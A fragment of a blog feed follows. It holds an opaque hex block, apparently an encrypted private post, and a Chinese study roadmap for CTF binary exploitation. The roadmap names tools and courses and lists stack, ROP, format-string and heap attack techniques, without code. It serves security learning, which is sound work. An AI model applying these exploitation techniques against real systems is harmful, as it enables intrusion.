ef3f8a181392d407562c56f863bdd86b30e82e9c11e4ebfca0712a1f7ff9c836cff731bd107de31d515bd78365ad4d86534effa4662ceffe054aa7a956550a32f9325597a45923d5152d7f3c064c0bb976dfdb4cdf2c97afcde6a616f6bd88c4e60a0290a9031a5cb52248ce02fdd225702e831ad6dd0c9019575a498b39bedee20879ff87845afcbc9c6738ea2758a011a5bf1bde5aa7d8455715cd84b353ed7342298d8f0ed1e176960fcdf59eb214316fe111b83e3f91239e002843eaaf71892c9b3b6b53e9f8f63b46382d331afbdcc392c4948b33f9162244699170a91d8b6cbb0ece25afb55a8f813cd60c376bed769635419cd1b54894c44aeeca289643a9e9d214c7edcfcb3dc5e15a7418878d3d06fe39acba562be19d5449b900a6ff224c55f306739a54e6e1c419d6b367f69d7d838bb6f0cac88305e994304cf4c24d7306c756f7ea8d7a01fb62b11e93c0d162a439c2884f3c7158235e3b64bbe16df7ac8e4841b353bcba67481daf184dcc4974b57439a5d5d18940b1f99781a151c5d8195afd741d9a6f7677ad26ca793a5808a762b177b54e2e1ada7711b5f86eebdae5415325f321aa6e775d01852ed3cc76d072e8f3c7762f47586bbccd0306a429e4b000c0049327bc3a4840c10640da4b1c9be8b10c015626f57e0f765411c8d1317088ba44b4083fa94808794b83dd71607cc44236aefc6d81866da39e52802db147bada47093472f061755dbb9ba62229c3843b225ba178e9b7073b3476a0126a264b94b2477ac54de324213b98d1fc0055ba43bffb5daf636414e6c273dd4be40c3698955c005b4638546a9476634faa90b7fdcdf6e755b4b7009054cd7de8b18cb3e0990ef6c25e8bb6284197ede21bd0de84a806d40d4260bdb2a3c151137a3e3fcf4652cd05f1ba17e0cf5356e20fc4aee588a2fd85060253312ccabe8b5c13b333b727b33b4fd13563499d369c5417b7d162a0052e01b691f2b3f54035a30c60aa43c4f35698a436789ee25e490cd57ae005a3c7906f94c3fdec434f29f63a9143954cb18cbd18c850f1e8d82baff7f5aed6e5cddd11bd5861f9a4207a3559e8438a66af9a5d6f648a1c439a64c8451184bfef9d538859f71387d1b5e101342666412c35c4135b62c7975eeb5461290b036eae4de71eae95a93ca2345b150b97a6371fef814512fe51938bb6fe86edebea468aa8caac3e457029087aec6600189e78a8fa906e062c7352ff99cf26518ee34dfec27bb6b4a34e65e31e6e35b76fd3d7349090a0fd4d186640c7fa6e7f36ddc5ded83cd6548a95af35c01f1b1d10c7f71b22216e1ae5bb9eff7655d1f56db2b1b239a92587f4cb8835d14a5920afe90e8c2cbd02a94a2fe31346378ecc633f6af4cacf37c651ec6e82f67de0d1407a3d99f0d80b2cc87a66664883b4c69550915a028ff8a70607e7a602d8b115bae9f07c798a8a989697b223d91ffec22f4b1df2060db87d06d942c7f05d95d220c33babf10340873ef97007fd956c4e0406d2e7795806023777dc1c91e455e2c7f2caa60d94c415f639cb1861abecec90269fa7ae370073b7e50d01eaf500b9fc0418b1926d4e39faf2cf773f06fb046385334680fcf8be2fc26b08b186c81598e98c00bcb7595061e379dc98db6c8e96309e957e21a3640a17a6d94e8dd53b82df89a664bf0f6cdcb6ce303498504dc90fc3c282fc5d83e68289e1dd4c6ecb96cd5a03c527e440722a4cd97d7244b8bdbbd50995b0ee8178d3eebaef47a0c75469ffc8c3776ef5fed7cbbfdb836142500859f1b4bb8ef560e6fe5b1c863b835798f7d29430eb70aa7edd5c05570059e5c429ba8fba9f334ba7224123d64efd455143ece14b7bc261320360fc88504f4571e3f6bcc695d6bb119a47b781e7f6989ce66ebad28e9e63dc169d0cdf6582674f662a157ddce65b6c5eade55dcc11e77b9d9a6101752a093d1945988784ce1cfc4b14d99bee08a568a98901aba1f04843005735c6bef2ca0af4f868c75ac76b3a34536d415e55c2b24d1116650b31c4cf90e274ac6e81ce9e90bd49c808f48ba4bfe57aaf03a0d083983783e782312e8ffe5edef023c104d650942c537f91b8746aa4848d518ac464b8030eefd1f777f1aaf11cc479a565643daf5a631bd9d5960c50557d51318bc6d2a747bedc958f847b5a1942191eda5645166680b63521a171c9a2bc1f8b66e7f61152b921f6fbda853e31bec70260e7dac084e8aa9b9d8136c20ad1a4988c90f19f76a206988a66b433aeec863170d669efae6f122174e0941910b7b63ed1c5ea95a3a5af0170e525f645503dd298a3c28df1968883af2e6ebb739059dc84b86d2d7d68dc1b156bdfc09d76ba2638a38417a50fec8e22abbbbbacc8333fae0fece19f046f568ca140b4995b92d7211cad1a5cfb64df55ca5f9697818774cd33e0b0f3b9dceb6a4a377771f58d843b19f8743877b4551812f82f85e3d86e4585e6b477b69637553ac078fc26553e622164af5a30a7f2b92c444e2e936de9bafc4a6a0941a029a310a35e473de9feb2aba4480f6562fea17f9f446ad534770e8d816645cd40b524c415c2ea5564a5d7c85fc93a7c2cf7c476bbcdb4f3bffb4aac0bbf5e009768361ce97159b78803201582a4d3d4d79c08d6b680b9bd3f8ba0f1ef820e84496b29ce4d89004efdcf8253cf6e2de1f14cdabe9aa8514acc35709286d2b084fe28f86d0b02b3c4686ae89c1338e1887fb19873f59d07232f0f28f45f8871178d619e5d90b10ee82dd231ddd275cf703b872140bc172f0148b5fc2f291f995b3f7acef8bf5a94367f0f8cf8d7122671572349b296dd183cf8defb4dc3bfcd96dc4a777e7da79fc6f5df159ef6b18350002979eb61f8f9ae018d9555f76dffb844bafb4849fbb2b89c953b245782c9ca839ad23a77012422544f05a6ef5a12f237e065d519a9606427d70aa7a477c4109b519d2e043ff8af31e39c5bfa03b7650992543dd5bd2c6ec92eb2f82e0b280959fa834d3afd4836f7cc9a0918280bfdae1dadd4da5cc4acf42da830603b0cfc91af5120fe76743d75770e0374247133974566c3565865e364e67b536a0273160d58121b0a1704245ec9d53b2efe2439a6e2b0a5ceaeae605c7d18745ebf846e9dc7e34852043d3c788795928617f9ae4d9f18a1f4781e4fe18e5aada3c8a19cfd126e7f67e984228f3de5636ef244a86432f5d5807496d3ef24f5e44bfb9a28e6995ed9179a5baf0e441baf2b8b4fc2e0d970fb8ddab383b3fd647d0efb39950806e43a65d251db9062a09ef5ff1507cd5579329807e7a30eb9ad6c9a83501e38130ae58db8f98a1653cedd53b8c1bc3052285ca5dc7c85646403bb741786bb24b748c4cf9e43f5f1f4347438b083abd17c9ec16d6d491e16ac94fb77b9a3c540928aee3cafae7cc507bd3b3c34bb178437f5573830a21e9363963861536dafb4a3e596fbccfe84655fad7bb9b4f65c593f6f37b8908f56fdaf30cea6c07b3af4d35fb4cc1631e8117ffff2810250bcff55361a945e6a1ea5d75fe23f05671fdfeb86fe91f583dfffa5eda9de90e6a0a0a93e02809ac687fe474a196175217dc8e3e75e3dfa301aa5cd3a563b100d315e52a0a1ddca7942052b4493ea76b001a202e4439519bb5120b3875ac6340b4f46ed6bb32b20eac373af499f1e98a9a624decde332569a2c932fa34f1b0b2cd6bee1df520660f670f74745560a8b2a62a33b08592bf932839e9ebf0888c229cf0da5f03f202a22053fbd8fb227a8515ea9d30b4073cb44d2d5f3bd62e0e06d24653d9456055b07c35d32ad38a52db47721ca36628b3ed6c939142055d77a46e150a0e1eabe4031d4bc957b245144deef054707af5cbe5ed3512f8b810b1c336e91dcbf90214a7ac177d7edfe2859cf754c0edef0d99dca53aab5f116792d35d2e4f71145ea0de310b0e7c87a9a53eb0b26d487dcf4514dc7ea6e33a34f3843467ae9a056110333d7d6a2d96217668cc5928e2ef608484a1311fd54fe470f79bfc42b0a76aa75e554d3e15c7a6748f20b8b07377b522c1b538fcf46d9abf4e58829ab4d45a31d0bc6dbab016af507ec0e24dddc6b133e1e6fc032c8c432228fc94a7d7350dff3ea056c585e58cac9a8c5600745df5a229a5cdfcab594584c073735255ae7c66519470a3a17c09ab319ad66c93399ff2cb7ec9bc2960638faaeb49217a72c05930f32d3f8269597b1cbf1c1899d22191e18f1e706a7442edc5d21164c9b8344b6cbccfbbe7aaafe2cced116cb19cb3147154d9e0dd786865d0bf6c9047f68ecd1833d2441570738a9ce926bf5a509f574ccce72035bceee9fe6b1703c2a75e7a7dc88ab021753074be64e883fc117abd0264f71cd3b5a236860426ade21d825d0907a7a038c1be7fa9c6f5e01f68695f31110a8af39d4e58a963e85fcf8aa321df4690296da8477d9249f07002a7056a2343f819d5909250709d8cefdc749e89637bdeaf426db8a6ec96a643e87516d66952ddb9267613bf7d6861d03a7dfc69cfe6231136adca281ce18935208d4b612bde217950b79a2d7ec3ad426e68599c5eaf0bcd9183e4b221c3c276d1bcf83729c36296cf2a45e4a737e7e69d31dc0d6e1e6100f6392ece659258d80418f8ca98c1b32c8696acc58ba9481de8d8d7c9c030b1f2dfc3bcf0ba623bfceefdecc42a51e3456897bd1f4db5515fe950f6aacb97248593945d7b2b72dfac0a536683d526179ab79a0aa19bb401bc48513a36e8488547c42fc0820c9ec73bae1e78803f8a47b21ff1ee636ced3d735f91a9f0728d69c1f259470ffe12954a488d8be1761da19c97150ec53c3c87ab8d571c47d214c504b3b9ebd76b309d18193d4af2b8b9959b18295dd6cfb348a4c903b9dba5f32be5baae9eff152b9d94a2b5d036ee6a79527f0412520137e71ef247cead55551295460a85bdc4ef35414a65f7efd26fa934fdf644660c308d243f7e0738a4445618a914db6f796719268d62d4912942f98522affb218bba9b16a4a0cf029959cff4b7b828a8eca7a282c8fd8ff7e307100c073ce1b3cc5cee7a295df3e2a5bebdafa5293a640360abd6d0d140743c163e17dbe708b3a3000265fd2940dbff82e72228525e9fc62d1de4cba9aca0fb992871f8af2b8613a70c0cf91b73c8f7d99550cb92bc26cfa46e6c7eb2ca92d44917740c976842f60842ffd19e5cc9ab344ee8364bcaac3a7a39673f345e972abeaac0cc3b997ab330551cabe0a6d33a914e71e6bc73c8546843fbfbcf6a25c2374ae579d4a6188912729f63d830221aacdf91f2b7970dbbe06c5058b6ff607ce0f38f2d0498aa0a5a21f9ee469ee82cbce3d5d77d495dd658d9aa28474cc348ea086864ab4b96fde575cbcaef345e77aea818dfb90935f50d450f7dde1aae15d308282ff041d7aa1c5ddc6fdd8719976679490de7ef2f4553ecfef2d47cd978b88bedf5afce494ca94df51a55c4bb96530eb662245dc92a2e1385277f441d6d907054a52b6db4812c7d9fa084e07fc364f1b6b25b11664550073485b353cfb7cbe82a1951cddd661cb93fc8b607b564113c14d28c2ce4fe0be9c11ac3d4b6da2dac7307c6a5cc49395b76c45bbe24cb79de23a53c17596aa94e83c5227d9bca064b7971aea9a26fa6d863b9924998f63575adfb1e98894e1ef0cdee2e629b20036e3f3739b1431b6f85e64a80000523b027ff69c7c6fafc816d89c75eb03832e7f72a2f55d3c3b9a4149fe1d84036dd1b6bed5ae47ac684b151cf8e680be48262964a0be52b6fb5b2f2c99cc5510298cfeb72c404e4e9ea8573021defa5cc93d937ea87a3b654a89ef84319dca16a4184d27b27150c8e1fa4f6279bce18efe8e8360e87969c18c3bdcc60d668c2fa676d53f5bc905d6a7190042351173e4da462b94163100e020a4544b2a5a6f6fd05ae02939cc78169b3cda7fe53ccaea89e02329e1162f79195ae2249ad327c311c093903f410c13493ea2991537468877129f88a92b4c340f2f3e5897cbebcedf629e79e95dc8fcf8bc8a50d4259080ca363dfe97021a78595e75eb81c369c9b8cd0433169684d7a1526eca9151b0d779119bd6e5a87ce4a247d6d181df68aad23596f776db214b0f07ec721c7b554c32b215bd8898a0b0c444096d52529424b6f452f76eb44f596bca6f5dae13e905afdc7eaf697134c25c33421e07f1f0d3e42e5e6bd8bd6a000a077819742e23f282eaa0e8e1fa7e6b927148c2c9b92999f74c744a36e8b3b17a6226c59aab791125a91f3574b59c6d99ac286f6cbdc182fe6895dc5c62bd019f60149022be28aa9325e2dd43df8c6b6ff2cc26e17284f4a0e086c0eeea48b64a6600174e3c888c1a8cb535f0d31ac9fcc71a0c8bb5f80aef3b345ce0d66159698416076997b1076c24309f996f9c5d8dbc59b91e8bd6b8e7b85f7e4a5598eb90feb0bad8184d1508a55e3be0a71e6ccf2db0128a02d6772af9c9b389eca9ab8465cc8b51278d34013da3aae84bb31a26e26ae6a2411c22cfb4c72f72884c08f03881f25d5a085d260834f3920019393d2b2d323310b280adaf1ecb05a3c5e34b2fc4c1eb3624fe251da120b5069479363b69efb880e8722a902c9c4f1710f4208ec6c58b09330024db1f1f8cd6214555be1a19bec0bb220297f922ce2d7b2afca816cb0f3e7ea1bf2a76984e6391e9f26b589b1ac23dcacb22d468496a8bced7aad91adfe4f41e422ea7fe3362333ad6b3e104b5f5ce3fcd14389b9bbbf48e4c3483520d57b2224cb76e824ae2a2c6222d3406aab105ad4ce767f1212973934147ca34868cd4daaeef204d26b20adee0499b746520db47ad3bca409a591c29bf0f76c77def9cb64f1abed11324776e52d7973ac81c6d5bb6d9250e5cd1fcb5a47e02a0cbb07d806313e0e30373a7f5734cc36f3896080cb780b9a9e14d799cae487ec0a225517ef4e12c054ca825a25d935a000e7ac1ce7ed31c0504bb296c7647bbee0877d2416712f3cb6b66e1dc48fb64aed22c45adf8c785a99206f66ff2eda620f29910bb108c509831be641309324c41f0d06124c45184ae1fc8fd2d2562ee76a1466d43318e72cc0c71684a1c4f3d0b31e7d01c0dd83e2c4f2631bfb291fe3730f7269d1bebec02fbe2dfd64fdc4d494c267ae86bc002194151716b9383fbea30fd68a0af3028175ac25764720840850b1d9a16754c235e60ecbc48320942fe4f4dc034d1fe013de4bcd1e0b2866e10d4f7212888ae598d99f85aef96f25d7a00b3667401a9ec988a60b3c828181435bf87ea10f33c7e2af7a40bd86e9d84278950fc73f5535a05d00c30455ca78a275ba0d7279dc075e343703e82d2027f18509eb63060443f70ed9f1093df1c8a92b9a916f1b4d8fb792c181c9502116b2103e9a9f2fb9ca45d45075f3e8d9583a3f855a7b74706dace1930971b1a1b1c7c395416fba694063e012745a68d7d009418b9e0ec146a4c3f14e49165dd37a0d52d4baa544597a682bec965bb853d81f68fa7abb167c3eddebc65e1e3db83a63b7b1e2eb317f70143006eee12b038b92d1311d7874069239eb9828dcfcc8bcf7eb43134d7607262d5415a31e8b358fd6e3158a7492342173d9be1031eb249f383b5974754985bb9d77d0e5d73d3e34f56a52edba709ba708d1c0cf26cd8f8988dbfea77ac9183dbba4c4924ad38afeb2bbc79ad070d100f044e8f6018ef3b25322a3accfde3cf754b3ae80acc484e7d1a0f03a83e10ffcdb79577110f048f29d9985370443a084ed2caca1cac8a049b4c1de837653e9b0e2db40be6f22314f703fc5a2ce7d734440db10c687c9960fc130eaf9026c76c8f17f2f7e0c94fb2abb654a98bfdd0f7c3154f57bad6530bfe327a27a02812263df15fb585b786072b213fd4747acea54f2f1242e2ab7099b667f21836f32f4a239d0633a428bdfd294807b04c9ea063d1239d99aa426e03f3206855f694872b84592cabeb6d0bfc149cbc60939a5bba7fa08477f99dd102144752329936d00c7099e38db35764b722b5b07fea00cb3022554ee2c7f7528899b0f9e09d0b3afe8484508f0bd3eea4fe14d71b1680b709f8e36cb67dfc12e6fd03f9bc6c60c5622bd3af4a41ba8c38945b8985ba2ef77c58dc3fa3b32a29f89a53136715e8ef250dbbb06eecabe4a7accea88b9a00083e2caf9d8330cd870b4b14e1b86a529c965b8fec354a5b1f4d86ff5b91258c5c5e01ab7af28b2b17323d718534e35826625c2f873447f2e492503ff3600f2a2f5a7e82a6bf037bb65591acd8ced62a897ecfb5fc7b181c1e48783e1aabf52fa010da87daa24b8d41d06abecfe72be937d8809241e23fae802b586c19dc4953e0e93ee00a47363a8de03e9cc0f277cebe44f9e69ba97a3500da215a540be3763d5573646867cd37bd6df4239d70756a6ecbc3c98f49036670d4eb25b8d9c1b0eb2aa7c614d9b1c87a9974bf09f21ffe6e65ffe61132429e6f4fceb95c9615edcfa52b53eebfb621916c99ae30467e10dd6db20ddfbbf76c2db401c83b4742193da81d056d6079a7db1e3ccb6d0ef665cafd666af26a416247dad4d97a221350186b89ab4131c5f489a3a5ce50204b94e0215eaf3fb8c46b06f0ea86da13718d78753730e2a9c9298f2308bb1c04f5ef45250c3c2251b20b1b0dbcb3b3960c743fc6fdd647bbafb37eb6430f9a40d4746995e38ae3b1b01270bd9e5b605174ee911aedfefaa7988035f86acc50822f7dd819b88248e4ef6c23b2fa5fa3599d55e4e05d993c1b030a37bf6ff8c333eb79d687f89fe3168caf559ff19ea8d4e1eb3091fe2f9850a51adf1b772f744f64ff29dfad0bb7ac34ea0e2cdbefa8d331893beb45e18949450c76f2e668bfb7840ed2a47113c32f07b05ddb85254da43078448a38188a5257f1b40e64a4c6506c3e785c3dea386a78a0e9c1e7fdfac29290b8d73112a475da777d186da1d3fc40b596e67df744be8e54102864254393f91e5b80c5fb8ae647d861a85252517bf9017c884f3d58000634a5ac7b092ad94c615983c770cda0ce6a0033bf870dc2183c2b351bc7775818b6e93618a4f4f102749e4598873611baf875dbd9971a05b7e331301595d347f1215dd116027d1c4ebff82c7c2e54e8ab7d882aa780a52486eba7787ec4a145b2bde165fa5c06d90d2b6e2fb834d0a72607183be7a0bcdb4c4fdca1c7f8916f7bfa4612e6f156629c023af7460cde7698b05bdd64c039ac2988486affee108400babb94796b999c1ba9add74724ed86b019863bd1de001c5e22babb15c84f7ed9b119aeaed392c321cf8d52ae979ee8cf2117668f66ca560f0fb228499082f5253ad4fbf7d93f58b08e700bb8e6142132530853ed995a2f6b781b7c46daea46a5ff6c4cae0a39ffd62249b1330dcb017f6da05e1100c998b3af2a68cab5173cfa03581ecfb4940d5ff8ede851299cfcfdd46acf9daf37a611a208e4232695e10cccf70922c3a435119d58938301d00f7702ca5b1ff65fe83e1a7d705dc21e897775c4abd259282e49f449c0bfd1e7c29652cbe49e0f6a0508c359690e44018dac80747a4afa8c6d8b2599d8fe7810d7ffbb6ff58fe5240a1c17c20e4dcdadbfeea36784685988b089ce699df4f91c21e29d47b6714b64781818d4aa9b4a405d612e3e40832d137bc2d5280891bb37a7dd837c1122458ffc8c527ae23ea88471323b5eb0062d562126a726e11c8b46457f1f5de018ab9dfcd67d95ea5f05f56f3cac15a0d63a39e3ed94949a50cb02d66d24dfd19127618c2036eec584d862a6467ae685783540c45ba007a36e38d9acdb514bd5f93018d485f42aa5c41a150a38794077064e8f8e700903351aae80794fc9713f69975e4b00a7c55f5659b776d97f8fdd4f18200898307f3722046bfd75add4f47cc975f3eae4ae3438743cd05db11fbbe8e590192a75d2ef9b3df62f4907c771ff6a99bb48b4756f411f3718c7aa88fb6fea116468687aa28bd59d2370fee2a024241e8c0e75d3a1069a361d1197198c252e582ef8a6aeaf0a76a83760305c0ec4b5afd0e4f3c1122dbe0ceef296c8ac065cfa92bba12bd2294ec6f4f3b0998cab381b3d93fd7dad9838cd9ecc9fc33baf3a08165dd9846a2f22c4cc63a0e0f4627c78425c53f67d18f96891bf12203168a974bf257987cbf0e1d9e959a39d5f49acc53f10ee0bdeaa676a5642d42a1b9c99cf728cd84b933e5102990996511fee063019103f9e00cdc3ee92593b3ea88f593c6e404274d5afacdb71b2e2920d92a52176b3d97040bbd02c9024b333db4c0c7d07654b8f8d0a8d6543995b2747fad5a3566f77d92e55bc4ea0d1d323b09b5ce0eae19f197fb3ea4bacc95d2e094cbd6669e8797af0770c7b2da0193f4ca0e32cf8c525957a08bf2960bb6dbd3ab68f1e52b1e5b71d54c3c51be5bf842c1652f4e2e428c5d242c870a6597bf708071266df1a9674d8201bd82989a5599a8ff1d75d1a0391e05d06eb42399bd9a4c56a3b20d3fc3370495db4f0682b336af54d4ab3446a5f24cff8ce3ba9027988b56231ccd22594cce58abc2ffff233d09f12d135ad1fb36685d43de3ce1644a149d49a80cbb95d8d2d5e72cc38574c08d4de28c6e35f8ff4460a2942218e80d5a0d21d06a4f2264b0bbad7291402dc96bcd2056f8131604763e47f6bcb423b1e140d84d61a23b980243c64066d4587dc29bebc102d4aa95346c74dd095e7a949a9b4c2eb1452ca4c24c94c413b94ad09d4b86912474d5bb225e065a09cc5854f1173850298758bb8ab4c954be4d001e62576e0d3bde5859a5a7529c3fa378c9068a34ffdccf4db57777526a489dc386aa84a1c6496698dc3b62ced171f8d71316146dbf120c9dc6738a80b3e29428a133a52c18045afbb4178b5fda47950eb85b7c53c27fc6721a1213fd35101250eeffcf32323796240c96c71c88dbf91558c7bce4e75f631b44e6f43738e8a940452a75dc3e8d6f5b63b2036aca6beebdf8fcd1c1ce844897e47f5cdb6afe006592b8cd588d5c2914ec2e457d949c2ac1fc3865aeba2d7984400d03f645f189220cf91bc9ce07bde1c4d3efc1feac266c499ba1858e33d61efd367574056822d795f4c486e0b70929ed6edb3e7cfb950ec0fa9860ecd7cf8488f3366b8eb75b024670fb4cfdb43d24cc2d7f67f54096690da047150cc0602de8da2007460680447af6e600be2de5ac0697fb72a50b9d4cc7319dc52fb095346181f70f92c0b276ece17f3c8fa3386f785fa3fd28a5f0008c2a278ce1f0df8c9c50930ca308c1143d04955aeb7c07e47d0ddc02e113132c2736997ecc519bf27b4a2bad82e87404f3d5c16d22b6d015b8ca7f4e2f61d0a0a1cc34529bd326af00dfcd4bc2b809a5ac1d184b6308f25ed971e932c43f50d4f13b5875476b31c91c1e7756993b65ce8b8c4f87a42723f03ceff2729ffa144efb553a151f71a554c46a38615269a397da3e4e6f943388b1f38277137f565f30263ab748ee60c70467d002cf2a516a89ba66990fe12563598497e3ed9905bda9a89c73952d5b23ca648a12c254f77dca5643fcd8e9a99d099913beef5554fa35dd8bea314724a4527f070b5941d126b4ade8ae06c57b25bcace33c63066f66c983f5288f6ac90b9067c205ceff0a402b3ab6807d8b234d4e4c8dc3747589f769be4e2f9d21e1087799beb808fc5301cbe770e5f7c5ddecb9ea39e6bfe5ba0543c054890b9f3dc20557bf2c7ce6e521f86918d1dd122cff13b4d61f066e093d76e14d3251028ecc7cc406def3efcfa05134c41c0098ffe4fd86ac66c998310249d8d43e8c368d96c558121c79ee304ce06a5a9ab790117b498903a7f623c6c16fd56402d310684dca3f3e9144e250313a6f57124762f62839c2a747c188305334fc06fa5991fb10b8323884e817fa3936c2a7c0813e56229d8807380bd51025cc7e1c469dc107843b0b88b2d6fad963218cb0f7e0687dba30b371f063b119a919f94ed5523e677c159c74d80c69add0be53a5342e556edea9d0f68eca443f5c2b2eb29790925cebc54052007e0b9eca6f6b130f9980b1f5073cc98db6a28c3eed5bd212b6233534bf753b82106fb9aaa7b55b704c60cb6f47183cf9efa775c5d11881d89a6d9a8d7bd155c5e23dffbf487634e1187a1737527d012d0df55ceb302526948dcadd6efc0d0027b5bc182d3aa184a55ab7c68b9bb2e029461c4d6adfeeba559591c3dbad0285508048fac3f625c506fe168a1c9ac9e2cfe9c24a4ba14b853ee9f20f18cd6fa1287c4efa1cc628d3ac0aaa54f2aeba3b9683418dbb9d32310a20f1e2f483c0a83230bfc49ea22aa7cdb414e665f0693a0d13505336d5913a7d11363d4cc252ecd920aaca6c71224358ef75b2743aa8b2082154c898819b1d21c9634413aab7cb054e21675a6bb007aafcb12a347b608a5c0c91a580b1e8ec3d9ddf93aea0367f0318fb0c649c8a5b5075319d0233d5adda7c78fe6936f1e561345e85ca9159819c54daf88eb2c95068d29125c4300f35f3bef0a62cb00f4ea7a592551f307701b39bfd0e801eb2c7f2caa76351dcc26f852c4b5c49950f31da914a32a3090c7ab64dbd621a970b96cada002e72ce4e5efe2ff299072a3c8b93391da4abc03d599d4c527589e488ec14bcb7d50926f4341eaf882942e2f341245b5de0b725154c972d4fe00c436d6a6f860c47fb8c7dbc98e5e6209817affb82d88d45d86d341aec813e0182712b5fe150556a67d5f5929df47cf4a063633a136b2c7097064ee1f8a0037a59647b3d981954eb17ae0f5ec9f0f021f35127815df28a1cd5de9c3e689d1b72a450964877c228cf50004d3ee03cb5c905638d64f32db08e46ad7b696566dd51cdde540e0c8ad0a031364dcd528ca4a31332bf25dd596445599bd2dadcaa34ff6400711c177e2c89a0259ce858889600175d59204337ee88d599f9b4b0d6de5346fbaef1ee4a9c2b23d99b1b88cdbaed02c97a93e4441b57288f35550189a49b5787717493015ee578d0a3f92722d492f67c33226031bec75c7436593b387552028ba1322701727a2de65a04065c56a63b3574d159ab7bd394097812135e028e450345103456f49b4eb1aef0ac4f9c659ac20c4e3c1c11bc974ca99d50bdc8815e56c27396a3c15d21f2798c6ec2e04f83b3f8910500a0ebf5f005e395ef826b05f7a573908d6846978b1003be562f56a3f213cfa3b31bd6409ff90f3369fb5f1a9be3fb1aee9ec07b21567b5380f6e30b6b415306cca58a58d7a8924c0ec53d7f64b0944a3d4199bb6dcded0190023d40ebed0830116a8ef5fe2dbd9899ddbc1bdcd2539bc6001afcd3bd193be95489aee1a5088ef5959ed9ddf6a211538a8ec13fa2742ada2b7d637ff2e7efb50d4381c4129ec6dc9921820d6bb990ec3a6ef12123eea97a33772c8ae5c384890bb854f7246659ed13a6b299d86bfa8154e2537b279c510a5f3f0852ef89219ae2cec0d9af2d35f7adfafeadafc67b96c3a2bce2ec7a7f4a45aaf0ac646b7901ed52798efaf8414e0642b75d108928513ab3b9cc889675c629108192e2e6b4c372850beb333272b6d645c9b23cdacc2d814c303305bb398ca567834ae5672c05a6aee2f2908e574ebd9a4824ae4d0b5c56d13a559c5ae2640c9b3c69c1e736c4486c26ea198dc7f697367d19509fe66c9b90374a4dbfb2a0fc26408e3f02f62c5602c33a4b02e0f8ccb875174ca2dd816b46cba338809b29b8070396265c110c28ef41e8ef132e03a6debcdbae584f82c5afbdde148ee7c3454ea42c57b0dff4b0cfe36ea261df2b841f2a60228da286f8655d656035cb7cfe7354d8f748fd3735c29efb4aec19dd44cc3083badb077133c2fa59f57e4ed7ea7553114aed4a450f5e9fa211b636cffa1b16b5118f64b5132eaf123f0db83c2328ee50651cf28abc561ae399c72dfbd07313a1f2d980e7596fcd21333bca55c314ffce6849460b32c178acfb442bacc218c9f30242f18e0c2c791eebd9748c62e44665e9f7ebd575e7ee38b70c900befae9782831357f9d3b1c69d520eaab151465862fd68a2fe1b9beb261a9a38b7a12c0d8f1f788cecf774a0879dec794aed9820e6946a86d156cb9f736fdb243f6a296b6188e73fe16c2560bfa29978dc84844147e4737aa5cba53d6a5f799c3cad1ac9a83df3215b2a44a9a93f716bc550325f89a59a38c24e58bcad242950f69d1051d910466c53eacf161e2b701af94d02bc9ea50d8ee663ad3b522b4208394dde3722d9072abbaca8dc64b41426da18ddf5bf474f8964bb16f8cc1a2428f5476bc9e698da4f5b059fc3f3353a7684898c06ceb76b4ccb68057a42abd8b585878650084273a2d41ea2b0aa9b59d5fa521bd60ec1f1501a53251ae8842e1395945321bdf3703a9122949f26890a69393b290bfcee8d02b973acfa242fa1955ee781711adccbd7d64541ac188175e6119c497c2da3a011ba0439e1629f9d24711da3a7d93f87243b510f58ee565aeb7dda819aa81eaa63a863e93e9293429a4a063210c65bec018e80381196e0c6278355957d028c3c76c489bc3ea3ed05c750692d7be59a9ccf0b96b2a322d05c75d0c8712ee983d]]></content>
      <categories>
        <category>私人空间</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[知识点总结与学习资料整理]]></title>
    <url>%2F2019%2F02%2F19%2F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[知识点总结：前提准备：工具准备： ubuntu虚拟机（建议装两个版本16.04和18.04，因为到后期堆的时候不同版本的ubuntu对应不同的glibc版本(我现在有5个版本)，而不同的glibc版本有不同的防御机制，思路会完全不一样。），当然有原装的更好了orz。 IDA pro。 gdb用于动态调试以及pwndbg插件，pwntools库。 vscode(虚拟机用的话会很卡，除非你分配8g内存给虚拟机。。。)。 Google，为什么不建议百度呢，因为google会显示出更多师傅的blog的文章，而百度大部分都是一些看似很牛逼但实际上不咋地的垃圾网站的帖子，无论是找学习资料还是找题解的wp，google都胜过百度。 知识准备： 汇编基础语法（对重点语句call，leave，retn等要有较深的理解） python基础语法 c语言较扎实（特别是指针和链表这一块） linux基本命令 第一阶段：pwnable.kr的第一部分：这一阶段主要的目的是了解pwn的题目形式，毕竟它和以往学的数学物理无论是学习还是做题形式都不一样，可能开始时都不会做，会毫无头绪直接看writeup，但是慢慢地就会习惯，找到套路，并且熟悉Linux的常用命令与怎么远程连接服务器，从远程服务器下载文件等基本功，等于是熟悉环境和题目大致形式的一个转变的过程。我的建议是在做完以后再自己独立地从头到尾地把exp整理一遍，确保自己能独立做出并理解其中的思想。 第二阶段：ctf-wiki与i春秋的体系学习：栈部分：分为以下几大块： 熟悉基本函数调用的栈的排布格局，理解leave，retn，call的意义，知道怎么算偏移，简称为基础栈溢出。 理解shellcode，在未开NX的情况下懂得利用shelllcode。 rop: 基础rop 带libc的rop brop stack pivot srop ret2_dl_runtime_reslove(32位和64位) ret2vsdo 在i春秋上有栈这一部分较完整的教程，且配有课后习题，比较好，配合wiki学习效果更佳，因为后来我发现看一篇文章很难理解一个技术，一般需要参考好几个orz（甚至上两位数），所以需要充足的耐心。 格式化字符串部分： i春秋的第六篇文章说的很清楚，题目质量也不错，配合wiki学习三天就可以结束（当然难度大的还是不行）。 堆部分： 学习堆的内存管理机制（较重要！！！不理解后面都是扯淡），当初我只是大致看了一下，感觉自己懂了，做题才发现自己太幼稚orz，堆是pwn中的重点内容，很多压轴都是建立在堆之上的。。所以这一块是重中之重！！ 堆漏洞： uaf，unlink，off-one-by（off-one-null)，double free，chunk overlapping。 堆溢出： fastbin-attack unsortedbin-attack largebin-attack house of orange house of spirit house of lore house of force house of roman house of atum（去年才出现） 其他：堆fengshui，，堆排布，堆喷（被鸡哥的薛定谔的堆虐惨了）等。。。。 第三阶段：专题刷题： 各个板块学习完以后的刷题，巩固知识点的理解。 第四阶段：综合刷题： 综合刷题，在不告诉你漏洞方向与漏洞点，没有提示的情况下独立做出来题目才是真本事。 资料整理：学习： ctf-wiki在阶段比较全的成体系的资料之一 